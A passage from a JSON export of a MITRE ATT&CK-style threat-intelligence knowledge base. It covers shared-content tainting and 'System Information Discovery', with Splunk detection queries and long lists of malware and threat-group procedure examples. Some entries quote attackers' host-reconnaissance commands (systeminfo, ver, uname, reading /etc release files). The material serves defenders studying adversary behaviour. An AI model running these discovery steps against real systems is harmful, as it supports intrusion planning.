      "Monitor for unexpected and abnormal accesses to network shares, especially those also associated with file activity. Monitor access to shared network directories to detect unauthorized or suspicious access, especially from unfamiliar accounts or at unusual times.Identify potential attempts to access hidden files or unusual file types within the directory.sourcetype=\"WinEventLog:Security\" EventCode=5145| search ObjectType=\"File\"| stats count by ShareName, AccountName, AccessMask, SourceIPAddress, _time| eval access_suspicious=if(match(ShareName, \"\\hidden_directory\\\") AND AccessMask=\"0x2\", \"suspicious\", \"normal\")| where access_suspicious=\"suspicious\"| table _time, ShareName, AccountName, AccessMask, SourceIPAddress, access_suspicious",
      "Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventID=1 OR sourcetype=\"linux:audit\" syscall=\"execve\"| search ParentImage IN (\"\\network_share\\.exe\", \"\\network_share\\.bat\")| stats count by Image, ParentImage, AccountName, CommandLine, _time| eval exec_suspicious=if(match(ParentImage, \"\\network_share\\\") AND AccountName!=\"known_service_account\", \"suspicious\", \"normal\")| where exec_suspicious=\"suspicious\""
    ],
    "Procedure Examples": [
      "BRONZE BUTLERhas placed malware on file shares and given it the same name as legitimate documents on the share.[2]",
      "Cinnamon Tempesthas deployed ransomware from a batch file in a network share.[3]",
      "Contican spread itself by infecting other remote machines via network shared drives.[4][5]",
      "Darkhotelused a virus that propagates by infecting executables stored on shared drives.[6]",
      "Gamaredon Grouphas injected malicious macros into all Word and Excel documents on mapped network drives.[7]",
      "H1N1has functionality to copy itself to network shares.[8]",
      "InvisiMolecan replace legitimate software or documents in the compromised network with their trojanized versions, in an attempt to propagate itself within the network.[9]",
      "Miner-Ccopies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.[10]",
      "Ramsaycan spread itself by infecting other portable executable files on networks shared drives.[11]",
      "RedCurlhas placed modified LNK files on network drives for lateral movement.[12][13]",
      "Stuxnetinfects remote servers via network shares and by infecting WinCC database views with malicious code.[14]",
      "Ursnifhas copied itself to and infected files in network drives for propagation.[15][16]"
    ]
  },
  "T1082": {
    "Name": "System Information Discovery",
    "Description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information fromSystem Information Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Tools such asSysteminfocan be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through thesystemsetupconfiguration tool on macOS. As an example, adversaries with user-level access can execute thedf -aHcommand to obtain currently mounted disks and associated freely available space. Adversaries may also leverage aNetwork Device CLIon network devices to gather detailed system information (e.g.show version).[1]On ESXi servers, threat actors may gather system information from various esxcli utilities, such assystem hostname get,system version get, andstorage filesystem list(to list storage volumes).[2][3]Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.[4][5][6]System Information Discoverycombined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.[7][8]",
    "Detects": [
      "Monitor executed commands and arguments that may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. For network devices, monitor executed commands in AAA logs, especially those run by unexpected or unauthorized users. On ESXi servers, monitor discovery commands in the/var/log/shell.loghistory file.",
      "Monitor for API calls that may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such asWindows Management InstrumentationandPowerShell. In cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
      "Monitor newly executed processes that may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture."
    ],
    "Procedure Examples": [
      "4H RATsends an OS version identifier in its beacons.[9]",
      "AcidPourcan identify various system locations and mapped devices on Linux systems as a precursor to wiping activity.[10]",
      "Action RAThas the ability to collect the hostname, OS version, and OS architecture of an infected host.[11]",
      "admin@338actors used the following commands after exploiting a machine withLOWBALLmalware to obtain information about the OS:ver >> %temp%\\downloadsysteminfo >> %temp%\\download[12]",
      "ADVSTORESHELLcan runSysteminfoto gather information about the victim.[13][14]",
      "Agent Teslacan collect the system's computer name and also has the capability to collect information on the processor, memory, OS, and video card from the system.[15][16][17]",
      "Akirauses theGetSystemInfoWindows function to determine the number of processors on a victim machine.[18]",
      "Amadeyhas collected the computer name and OS version from a compromised machine.[19][20]",
      "Anchorcan determine the hostname and linux version on a compromised host.[21]",
      "AppleJeushas collected the victim host information after infection.[22]",
      "AppleSeedcan identify the OS version of a targeted system.[23]",
      "APT18can collect system information from the victim’s machine.[24]",
      "APT19collected system architecture information.APT19used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.[25][26]",
      "APT3has a tool that can obtain information about the local system.[27][28]",
      "APT32has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server.APT32executed shellcode to identify the name of the infected host.[29][30][31][32]",
      "APT37collects the computer name, the BIOS model, and execution path.[33]",
      "APT38has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs.[34]",
      "APT41uses multiple built-in commands such assysteminfoandnet config Workstationto enumerate victim system basic configuration information.[35]",
      "APT42has used malware, such as GHAMBAR and POWERPOST, to collect system information.[36]",
      "Aquatic Pandahas used native OS commands to understand privilege levels and system details.[37]",
      "ArcaneDoorincluded collection of victim device configuration information.[38]",
      "Aria-bodyhas the ability to identify the hostname, computer name, Windows version, processor speed, machine GUID, and disk information on a compromised host.[39]",
      "Astarothcollects the machine name and keyboard language from the system.[40][41]",
      "AsyncRATcan check the disk size through the values obtained withDeviceInfo.[42]",
      "Attormonitors the free disk space on the system.[43]",
      "AuTo Stealerhas the ability to collect the hostname and OS information from an infected host.[11]",
      "Avengerhas the ability to identify the host volume ID and the OS architecture on a compromised host.[44]",
      "Azorultcan collect the machine information, system architecture, the OS version, computer name, Windows product name, the number of CPU cores, video card information, and the system language.[45][46]",
      "Babukcan enumerate disk volumes, get disk information, and query service status.[47]",
      "BabySharkhas executed thevercommand.[48]",
      "BackConfighas the ability to gather the victim's computer name.[49]",
      "Backdoor.Oldreacollects information about the OS and computer name.[50][51]",
      "During its initial execution,BACKSPACEextracts operating system information from the infected host.[52]",
      "BADCALLcollects the computer name and host name on the compromised system.[53]",
      "BADFLICKhas captured victim computer name, memory space, and CPU details.[54]",
      "BADHATCHcan obtain current system information from a compromised machine such as theSHELL PID,PSVERSION,HOSTNAME,LOGONSERVER,LASTBOOTUP, drive information, OS type/version, bitness, and hostname.[55][56]",
      "BadPatchcollects the OS system, OS version, MAC address, and the computer name from the victim’s machine.[57]",
      "Bandookcan collect information about the drives available on the system.[58]",
      "Bankshotgathers system information, network addresses, disk type, disk free space, and the operation system version.[59][60]",
      "Bazarcan fingerprint architecture, computer name, and OS version on the compromised host.Bazarcan also check if the Russian language is installed on the infected machine and terminate if it is found.[61][62]",
      "BISCUIThas a command to collect the processor type, operation system, computer name, and whether the system is a laptop or PC.[63]",
      "Bisonalhas used commands and API calls to gather system information.[64][65][66]",
      "Black Bastacan enumerate volumes and collect system boot configuration and CPU information.[67][68]",
      "BlackByteused various system commands and tools to pull system information during operations.[69][70][71]",
      "BlackByte Ransomwaregathers victim system information to generate a unique victim identifier.[72]",
      "BlackCatcan obtain the computer name and UUID, and enumerate local drives.[73]",
      "BlackEnergyhas usedSysteminfoto gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor.[74][75]",
      "BlackMouldcan enumerate local drives on a compromised host.[76]",
      "BLINDINGCANhas collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available.[77]",
      "Blue Mockingbirdhas collected hardware details for the victim's system, including CPU and memory information.[78]",
      "BLUELIGHThas collected the computer name and OS version from victim machines.[79]",
      "BOLDMOVEperforms system survey actions following initial execution.[80]",
      "Bonadanhas discovered the OS version, CPU model, and RAM size of the system it has been installed on.[81]",
      "BoomBoxcan enumerate the hostname, domain, and IP of a compromised host.[82]",
      "Brave Princecollects hard drive content and system configuration information.[83]",
      "BUBBLEWRAPcollects system information, including the operating system version and hostname.[12]",
      "build_downerhas the ability to send system volume information to C2.[44]",
      "Bumblebeecan enumerate the OS version and domain on a targeted system.[84][85][86]",
      "Bundlorewill enumerate the macOS version to determine which follow-on behaviors to execute using/usr/bin/sw_vers -productVersion.[87][8]",
      "DuringC0017,APT41issuedping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+commands to find the volume serial number of compromised systems.[88]",
      "CaddyWipercan useDsRoleGetPrimaryDomainInformationto determine the role of the infected machine.CaddyWipercan also halt execution if the compromised host is identified as a domain controller.[89][90]",
      "Cadelspyhas the ability to discover information about the compromised host.[91]",
      "Cannoncan gather system information from the victim’s machine such as the OS version, machine name, and drive information.[92][93]",
      "Carberphas collected the operating system version from the infected system.[94]",
      "Cardinal RATcan collect the hostname, Microsoft Windows version, and processor architecture from a victim machine.[95]",
      "CARROTBAThas the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture.[96][97]",
      "Caterpillar WebShellhas a module to gather information from the compromised asset, including the computer version, computer name, IIS version, and more.[98]",
      "Chaeshas collected system information, including the machine name and OS version.[99]",
      "CharmPowercan enumerate the OS version and computer name on a targeted system.[100]",
      "ChChescollects the victim hostname, window resolution, and Microsoft Windows version.[101][102]",
      "Chimerahas usedfsutil fsinfo drives,systeminfo, andvssadmin list shadowsfor system information including shadow volumes and drive information.[103]",
      "Chrommmehas the ability to list drives and obtain the computer name of a compromised host.[104]",
      "Clamblingcan discover the hostname, computer name, and Windows version of a targeted machine.[105][106]",
      "cmdcan be used to find information about the operating system.[107]",
      "Comniecollects the hostname of the victim machine.[108]",
      "Confuciushas used a file stealer that can examine system drives, including those other than the C drive.[109]",
      "CORESHELLcollects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.[110]",
      "Covenantimplants can gather basic information on infected systems.[111]",
      "A system info module inCozyCargathers information on the victim host’s configuration.[112]",
      "CrackMapExeccan enumerate the system drives and associated system name.[113]",
      "Crimsoncontains a command to collect the victim PC name, disk drive information, and operating system.[114][115][116]",
      "Cubacan enumerate local drives, disk type, and disk free space.[117]",
      "Cuckoo Stealercan gather information about the OS version and hardware on compromised hosts.[118][119]",
      "CURIUMdeploys information gathering tools focused on capturing IP configuration, running application, system information, and network connectivity information.[120]",
      "DuringCutting Edge, threat actors used the ENUM4LINUX Perl script for discovery on Windows and Samba hosts.[121]",
      "Cyclops Blinkhas the ability to query device information.[122]",
      "Daggerflyutilizes victim machine operating system information to create custom User Agent strings for subsequent command and control communication.[123]",
      "DarkCometcan collect the computer name, RAM used, and operating system version from the victim’s machine.[124][125]",
      "DarkGateuses the Delphi methodsSysutils::DiskSizeandGlobalMemoryStatusExto collect disk size and physical memory as part of the malware's anti-analysis checks for running in a virtualized environment.[126]DarkGatewill gather various system information such as domain, display adapter description, operating system type and version, processor type, and RAM amount.[126][127]",
      "Darkhotelhas collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine.[128][129]",
      "DarkTortillacan obtain system information by querying theWin32_ComputerSystem,Win32_BIOS,Win32_MotherboardDevice,Win32_PnPEntity, andWin32_DiskDriveWMI objects.[130]",
      "DarkWatchmancan collect the OS version, system architecture, and computer name.[131]",
      "DEADEYEcan enumerate a victim computer's volume serial number and host name.[88]",
      "DEATHRANSOMcan enumerate logical drives on a target system.[132]",
      "Deniscollects OS information and the computer name from the victim’s machine.[133][134]",
      "Derusbigathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.[135]",
      "Diavolcan collect the computer name and OS version from the system.[136]",
      "down_newhas the ability to identify the system volume information of a compromised host.[44]",
      "DownPapercollects the victim host name and serial number, and then sends the information to the C2 server.[137]",
      "Dridexhas collected the computer name and OS architecture information from the system.[138]",
      "DropBookhas checked for the presence of Arabic language in the infected machine's settings.[139]",
      "dsqueryhas the ability to enumerate various information, such as the operating system and host name, for systems within a domain.[88]",
      "Dtrackcan collect the victim's computer name, hostname and adapter information to create a unique identifier.[140][141]",
      "DUSTTRAPreads the value of the infected system'sHKLM\\SYSTEM\\Microsoft\\Cryptography\\MachineGUIDvalue.[142]",
      "DustySkyextracts basic information about the operating system.[143]",
      "Dyrehas the ability to identify the computer name, OS version, and hardware configuration on a compromised host.[144]",
      "Egregorcan perform a language check of the infected system and can query the CPU information (cupid).[145][146]",
      "Eliseexecutessysteminfoafter initial communication is made to the remote server.[147]",
      "Emissaryhas the capability to execute ver and systeminfo commands.[148]",
      "Empirecan enumerate host system information like OS, architecture, domain name, applied patches, and more.[149][150]",
      "EnvyScoutcan determine whether the ISO payload was received by a Windows or iOS device.[82]",
      "Epiccollects the OS version, hardware information, computer name, available system memory status, disk space information, and system and user language settings.[151]",
      "EVILNUMcan obtain the computer name from the victim's system.[152]",
      "Explosivehas collected the computer name from the infected host.[153]",
      "FALLCHILLcan collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.[154]",
      "FatDukecan collect the user name, Windows version, computer name, and available space on discs from a compromised host.[155]",
      "Felismuscollects the system information, including hostname and OS version, and sends it to the C2 server.[156]",
      "FELIXROOTcollects the victim’s computer name, processor architecture, OS version, volume serial number, and system type.[157][158]",
      "Ferociouscan useGET.WORKSPACEin Microsoft Excel to determine the OS version of the compromised host.[159]",
      "FIN13has collected local host information by utilizing Windows commandssysteminfo,fsutil, andfsinfo.FIN13has also utilized a compromised Symantex Altiris console and LanDesk account to retrieve host information.[160][161]",
      "FIN8has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader.[162]",
      "Final1stspyobtains victim Microsoft Windows version information and CPU architecture.[163]",
      "FinFisherchecks if the victim OS is 32 or 64-bit.[164][165]",
      "FlawedAmmyycan collect the victim's operating system and computer name during the initial infection.[166]",
      "DuringFrankenstein, the threat actors usedEmpireto obtain the compromised machine's name.[150]",
      "FunnyDreamcan enumerate all logical drives on a targeted machine.[167]",
      "DuringFunnyDream, the threat actors usedSysteminfoto collect information on targeted hosts.[167]",
      "Fysbishas used the commandls /etc | egrep -e\"fedora*|debian*|gentoo*|mandriva*|mandrake*|meego*|redhat*|lsb-*|sun-*|SUSE*|release\"to determine which Linux OS version is running.[168]",
      "AGamaredon Groupfile stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.[169][170][171]",
      "Gelsemiumcan determine the operating system and whether a targeted machine has a 32 or 64 bit architecture.[104]",
      "Get2has the ability to identify the computer name and Windows version of an infected host.[172]",
      "gh0st RAThas gathered system architecture, processor, OS configuration, and installed hardware information.[173]",
      "Gold Dragoncollects endpoint information using thesysteminfocommand.[83]",
      "GoldenSpyhas gathered operating system information.[174]",
      "Gomircollects information on infected systems such as hostname, username, CPU, and RAM information.[175]",
      "Gootloadercan inspect the User-Agent string in GET request header information to determine the operating system of targeted systems.[176]",
      "Grandoreirocan collect the computer name and OS version from a compromised host.[177]",
      "GravityRATcollects the MAC address, computer name, and CPU information.[178]",
      "Green Lambertcan useunameto identify the operating system name, version, and processor type.[179][180]",
      "GRIFFONhas used a reconnaissance module that can be used to retrieve information about a victim's computer, including the resolution of the workstation .[181]",
      "GrimAgentcan collect the OS, and build version on a compromised host.[182]",
      "HALFBAKEDcan obtain information about the OS, processor, and BIOS.[183]",
      "can collect system information, including computer name, system manufacturer, IsDebuggerPresent state, and execution path.[184]",
      "HAWKBALLcan collect the OS version, architecture information, and computer name.[185]",
      "HELLOKITTYcan enumerate logical drives on a target system.[132]",
      "HermeticWipercan determine the OS version, bitness, and enumerate physical drives on a targeted host.[186][187][188][189]",
      "HEXANEhas collected the hostname of a compromised machine.[190]",
      "Heyoka Backdoorcan enumerate drives on a compromised host.[191]",
      "Higaisacollected the system volume serial number, GUID, and computer name.[192][193]",
      "Hildegardhas collected the host's OS, CPU, and memory information.[194]",
      "HOPLIGHThas been observed collecting victim machine information like OS version, volume information, and more.[195]",
      "HotCroissanthas the ability to determine if the current user is an administrator, Windows product name, processor name, screen resolution, and physical RAM of the infected host.[196]",
      "Hydraqcreates a backdoor through which remote attackers can retrieve information such as computer name, OS version, processor speed, memory size, and CPU speed.[197]",
      "TheIceAppleServer Variable Dumper module iterates over all server variables present for the current request and returns them to the adversary.[198]",
      "IcedIDhas the ability to identify the computer name and OS version on a compromised host.[199][200]",
      "IMAPLoaderuses WMI queries to gather information about the victim machine.[201]",
      "INC Ransomwarecan discover and mount hidden drives to encrypt them.[202]",
      "Inceptionhas used a reconnaissance module to gather information about the operating system and hardware on the infected host.[203]",
      "Industroyercollects the victim machine’s Windows GUID.[204]",
      "InnaputRATgathers volume drive information and system information.[205]",
      "InvisiMolecan gather information on the mapped drives, OS version, computer name, DEP policy, memory size, and system volume serial number.[206][207]",
      "Ixeshecollects the computer name of the victim's system during the initial infection.[208]",
      "JHUHUGITobtains a build identifier as well as victim hard drive information from Windows registry keyHKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum. AnotherJHUHUGITvariant gathers the victim storage volume serial number and the storage device name.[209][210]",
      "JPINcan obtain system information such as OS version and disk space.[211]",
      "jRATcollects information about the OS (version, build type, install date) as well as system up-time upon receiving a connection from a backdoor.[212]",
      "DuringJuicy Mix,OilRigused a script to send the name of the compromised host via HTTPPOSTto register it with C2.[213]",
      "Kapekautilizes WinAPI calls and registry queries to gather system information.[214]",
      "KARAEcan collect system information.[184]",
      "Kasidethas the ability to obtain a victim's system name and operating system version.[215]",
      "Kazuargathers information on the system and local drives.[216]",
      "Ke3changperforms operating system information discovery usingsysteminfoand has used implants to identify the system language and computer name.[217][218][219]",
      "Kerrdownhas the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.[220]",
      "Kesselhas collected the system architecture, OS version, and MAC address information.[81]",
      "Kevincan enumerate the OS version and hostname of a targeted machine.[190]",
      "KeyBoycan gather extended system information, such as information about the operating system, disks, and memory.[221][222]",
      "KEYMARBLEhas the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start.[223]",
      "KGH_SPYcan collect drive information from a compromised host.[224]",
      "KillDiskretrieves the hard disk name by calling theCreateFileA to \\.\\PHYSICALDRIVE0API.[225]",
      "Kimsukyhas enumerated drives, OS type, OS version, and other information using a script or the \"systeminfo\" command.[226][227]",
      "Koadiccan obtain the OS version and build, computer name, and processor architecture from a compromised host.[228]",
      "Kobaloscan record the hostname and kernel version of the target machine.[229]",
      "KOCTOPUShas checked the OS version usingwmic.exeand thefindcommand.[228]",
      "KOMPROGOis capable of retrieving information about the infected system.[230]",
      "KONNIcan gather the OS version, architecture information, connected drives, hostname, RAM size, and disk space information from the victim’s machine and has usedcmd /c systeminfocommand to get a snapshot of the current system state of the target machine.[231][232][233]",
      "KOPILUWAKcan discover logical drive information on compromised hosts.[234]",
      "KV Botnet Activityincludes use of native system tools, such asuname, to obtain information about victim device architecture, as well as gathering other system information such as the victim's hosts file and CPU utilization.[235]",
      "Kwampirscollects OS version information such as registered owner details, manufacturer details, processor type, available storage, installed patches, hostname, version info, system date, and other system information by using the commandssysteminfo,net config workstation,hostname,ver,set, anddate /t.[236]",
      "Latrodectuscan gather operating system information.[237][238][238][239]",
      "SeveralLazarus Groupmalware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used byLazarus Groupalso collects disk space information and sends it to its C2 server.[240][241][242][243][244][245]",
      "Leviathanperformed host enumeration and data gathering operations on victim machines duringLeviathan Australian Intrusions.[246]",
      "LightNeurongathers the victim computer name using the Win32 API callGetComputerName.[247]",
      "LightSpy's second stage implant uses theDeviceInformationclass to collect system information, including CPU usage, battery statistics, memory allocations, screen size, etc.[248]",
      "Line Dancercan gather system configuration information by running the nativeshow configurationcommand.[249]",
      "Linfocreates a backdoor through which remote attackers can retrieve system information.[250]",
      "LiteDukecan enumerate the CPUID and BIOS version on a compromised system.[155]",
      "LitePowerhas the ability to list local drives and enumerate the OS architecture.[159]",
      "LITTLELAMB.WOOLTEAcan check the type of Ivanti VPN device it is running on by executingfirst_run()to identify the first four bytes of the motherboard serial number.[251]",
      "Lizarcan collect the computer name from the machine,.[252]",
      "LockBit 2.0can enumerate system information including hostname, domain information, and local drive configuration.[253][254]",
      "LockBit 3.0can enumerate system hostname, domain, and local drive configuration.[255]",
      "Lokibothas the ability to discover the computer name and Windows product name/version.[256]",
      "LoudMinerhas monitored CPU usage.[257]",
      "Lucifercan collect the computer name, system architecture, default language, and processor frequency of a compromised host.[258]",
      "Lumma Stealerhas gathered various system information from victim machines.[259][260][261]",
      "LunarMailcan capture environmental variables on compromised hosts.[262]",
      "LunarWebcan use WMI queries and shell commands such as systeminfo.exe to collect the operating system, BIOS version, and domain name of the targeted system.[262]",
      "Machetecollects the hostname of the target computer.[263]",
      "MacMacan collect information about a compromised computer, including: Hardware UUID, Mac serial number, macOS version, and disk sizes.[264]",
      "macOS.OSAMinercan gather the device serial number and has checked to ensure there is enough disk space using the Unix utilitydf.[265]",
      "Mafaldacan collect the computer name and enumerate all drives on a compromised host.[266][267]",
      "Magic Houndmalware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.[268][269][270]",
      "MagicRATcollects basic system information from victim machines.[271]",
      "Malteirocollects the machine information, system architecture, the OS version, computer name, and Windows product name.[272]",
      "Mangocan collect the machine name of a compromised system which is later used as part of a unique victim identifier.[213]",
      "Manjusakaperforms basic system profiling actions to fingerprint and register the victim system with the C2 controller.[273]",
      "MarkiRATcan obtain the computer name from a compromised host.[274]",
      "Mazehas checked the language of the infected system using the \"GetUSerDefaultUILanguage\" function.[275]",
      "metaMaincan collect the computer name from a compromised host.[267]",
      "Metamorfohas collected the hostname and operating system version from the compromised host.[276][277][278]",
      "Meteorhas the ability to discover the hostname of a compromised host.[279]",
      "Micropsiagathers the hostname and OS version from the victim’s machine.[280][281]",
      "Milancan enumerate the targeted machine's name and GUID.[282][283]",
      "MiniDukecan gather the hostname on a compromised machine.[155]",
      "MirageFoxcan collect CPU and architecture information from the victim’s machine.[284]",
      "The initial beacon packet forMis-Typecontains the operating system version and file system of the victim.[285]",
      "The initial beacon packet forMisdatcontains the operating system version of the victim.[285]",
      "Mispaducollects the OS version, computer name, and language ID.[286]",
      "MobileOrderhas a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.[287]",
      "MoleNetcan collect information about the about the system.[139]",
      "Mongallcan identify drives on compromised hosts and retrieve the hostname viagethostbyname.[191]",
      "Moonstone Sleethas gathered information on victim systems.[288]",
      "MoonWindcan obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution.[289]",
      "More_eggshas the capability to gather the OS version and computer name.[290][291]",
      "Moses Staffcollected information about the infected host, including the machine names and OS architecture.[292]",
      "MuddyWaterhas used malware that can collect the victim’s OS version and machine name.[293][294][295][296][297]",
      "MURKYTOPhas the capability to retrieve information about the OS.[298]",
      "Mustang Pandahas gathered system information usingsysteminfo.[299]",
      "Mustard Tempesthas used implants to perform system reconnaissance on targeted systems.[300]",
      "Naidcollects a unique identifier (UID) from a compromised host.[301]",
      "NanHaiShucan gather the victim computer name and serial number.[302]",
      "NavRATusessysteminfoon a victim’s machine.[303]",
      "NDiskMonitorobtains the victim computer name and encrypts the information to send over its C2 channel.[304]",
      "Nebulaecan discover logical drive information including the drive type, free space, and volume information.[305]",
      "Neoichorcan collect the OS version and computer name from a compromised host.[219]",
      "Netwalkercan determine the system architecture it is running on to choose which version of the DLL to use.[306]",
      "NETWIREcan discover and collect victim system information.[307]",
      "Nightdoorgathers information on the victim system such as CPU and Computer name as well as device drivers.Nightdoorcan also collect information about disk drives, their total and free space, and file system type.[123]",
      "Ninjacan obtain the computer name and information on the OS and physical drives from targeted hosts.[308][309]",
      "njRATenumerates the victim operating system and computer name during the initial infection.[310]",
      "NKAbuseconducts multiple system checks and includes these in subsequent \"heartbeat\" messages to the malware's command and control server.[311]",
      "NOKKIcan gather information on drives and the operating system on the victim’s machine.[312]",
      "ObliqueRAThas the ability to check for blocklisted computer names on infected endpoints.[313]",
      "OceanSaltcan collect the computer name from the system.[314]",
      "Octopuscan collect system drive information, the computer name, the size of the disk, OS version, and OS architecture information.[315]",
      "OilBoostercan identify the compromised system's hostname which is used to create a unique identifier.[316]",
      "OilRighas runhostnameandsysteminfoon a victim.[317][318][319][320][321]",
      "Okrumcan collect computer name, locale information, and information about the OS and architecture.[322]",
      "OopsIEchecks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks.[323]",
      "DuringOperation CuckooBees, the threat actors used thesysteminfocommand to gather details about a compromised system.[324]",
      "DuringOperation Honeybee, the threat actors collected the computer name, OS, and other system information usingcmd /c systeminfo > %temp%\\ temp.ini.[325]",
      "DuringOperation Wocao, threat actors discovered the local disks attached to the system and their hardware information including manufacturer and model, as well as the OS versions of systems connected to a targeted network.[326]",
      "Orzcan gather the victim OS version and whether it is 64 or 32 bit.[302]",
      "OSInfodiscovers information about the infected machine.[27]",
      "OSX/Shlayerhas collected the IOPlatformUUID, session UID, and the OS version using the commandsw_vers -productVersion.[327][328]",
      "OSX_OCEANLOTUS.Dcollects processor information, memory information, computer name, hardware UUID, serial number, and operating system version.OSX_OCEANLOTUS.Dhas used theioregcommand to gather some of this information.[329][330][8]",
      "Pasamcreates a backdoor through which remote attackers can retrieve information such as hostname and free disk space.[331]",
      "Patchworkcollected the victim computer name, OS version, and architecture type and sent the information to its C2 server.Patchworkalso enumerated all available drives on the victim's machine.[332][304]",
      "Pay2Keyhas the ability to gather the hostname of the victim machine.[333]",
      "Penquincan report the file system type and disk space of a compromised host to C2.[334]",
      "Pikabotperforms a variety of system checks and gathers system information, including commands such aswhoami.[335][336]",
      "PinchDukegathers system configuration information.[337]",
      "PingPullcan retrieve the hostname of a compromised host.[338]",
      "PipeMoncan collect and send OS version and computer name as a part of its C2 beacon.[339]",
      "Pisloaderhas a command to collect victim system information, including the system name and OS version.[340]",
      "PLAINTEEcollects general system enumeration data about the infected machine and checks the OS version.[341]",
      "Playhas leveraged tools to enumerate system information.[342]",
      "PoetRAThas the ability to gather information about the compromised host.[343]",
      "Ponyhas collected the Service Pack, language, and region information to send to the C2.[344]",
      "POORAIMcan identify system information, including battery status.[184]",
      "PoshC2contains modules, such asGet-ComputerInfo, for enumerating common system information.[345]",
      "PowerDukehas commands to get information about the victim's name, build, version, serial number, and memory usage.[346]",
      "PowerShowerhas collected system information on the infected host.[347]",
      "POWERSTATScan retrieve OS name/architecture and computer/domain name information from compromised hosts.[348][349]",
      "POWRUNERmay collect information about the system by runninghostnameandsysteminfoon a victim.[350]",
      "A module inPrikormkacollects information from the victim about Windows OS version, computer name, battery info, and physical memory.[351]",
      "Proxysvccollects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.[244]",
      "PUNCHBUGGYcan gather system information such as computer names.[352]",
      "Pupycan grab a system’s information including the OS version, architecture, etc.[353]",
      "QakBotcan collect system information including the OS version and domain on a compromised host.[354][355][356][300]",
      "QuasarRATcan gather system information from the victim’s machine including the OS type.[357]",
      "Raccoon Stealergathers information on infected systems such as operating system, processor information, RAM, and display information.[358][359]",
      "Ramsaycan detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.[360][361]",
      "RansomHubcan retrieve information about virtual machines.[362]",
      "Raspberry Robinperforms several system checks as part of anti-analysis mechanisms, including querying the operating system build number, processor vendor and type, video controller, and CPU temperature.[363]",
      "RATANKBAgathers information about the OS architecture, OS name, and OS version/Service pack.[364][365]",
      "RCSessioncan gather system information from a compromised host.[366]",
      "Reavercollects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information.[367]",
      "RedCurlhas collected information about the target system, such as system information and list of network connections.[368][369]",
      "Mustang Pandacaptured victim operating system type via User Agent analysis duringRedDelta Modified PlugX Infection Chain Operations.[370]",
      "RedLeavescan gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information.[102][371]",
      "Remseccan obtain the OS version information, computer name, processor architecture, machine role, and OS edition.[372]",
      "Revenge RATcollects the CPU information, OS information, and system language.[373]",
      "REvilcan identify the username, machine name, system language, keyboard layout, OS version, and system drive information on a compromised host.[374][375][376][377][377][378][379][380]",
      "Rifdoorhas the ability to identify the Windows version on the compromised host.[381]",
      "Rising Suncan detect the computer name, operating system, and drive information, including drive type, total number of bytes on disk, total number of free bytes on disk, and name of a specified volume.[382]",
      "ROADSWEEPcan enumerate logical drives on targeted devices.[383][384]",
      "Rockehas used uname -m to collect the name and information about the infected system's kernel.[385]",
      "RogueRobingathers BIOS versions and manufacturers, the number of CPU cores, the total physical memory, and the computer name.[386]",
      "ROKRATcan gather the hostname and the OS version to ensure it doesn’t run on a Windows XP or Windows Server 2003 systems.[387][388][389][390][391][392]",
      "RotaJakiroexecutes a set of commands to collect device information, includinguname.  Another example is thecat /etc/*release | uniqcommand used to collect the current OS distribution.[393]",
      "Royalcan useGetNativeSystemInfoandGetLogicalDrivesto enumerate system processors and logical drives.[394][395]",
      "RTMcan obtain the computer name, OS version, and default language identifier.[396]",
      "RunningRATgathers the OS version, logical drives information, processor information, and volume information.[83]",
      "Ryukhas calledGetLogicalDrivesto emumerate all mounted drives, andGetDriveTypeWto determine the drive type.[397]",
      "The initial beacon packet forS-Typecontains the operating system version and file system of the victim.[285]",
      "Sagerunexgathers information from the infected system such as hostname.[398]",
